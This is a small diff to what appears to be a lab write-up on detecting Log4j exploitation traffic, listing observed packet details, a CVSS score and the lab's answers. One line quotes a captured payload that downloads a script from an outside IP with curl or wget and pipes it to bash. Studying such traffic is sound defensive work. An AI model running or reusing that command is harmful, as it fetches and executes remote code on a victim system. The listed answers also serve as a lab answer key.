@@ -370,7 +370,7 @@
     - Command: `(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash` [].
 11. Searched NIST for CVSS v2 score of Log4j (CVE-2021-44228): **9.3** 
 
-**Answers** (per your input, with CVSS correction noted):
+**Answers** :
 - **Number of detected packets**: 26
 - **Number of rules triggered**: 4
 - **First six digits of SIDs**: `210037`
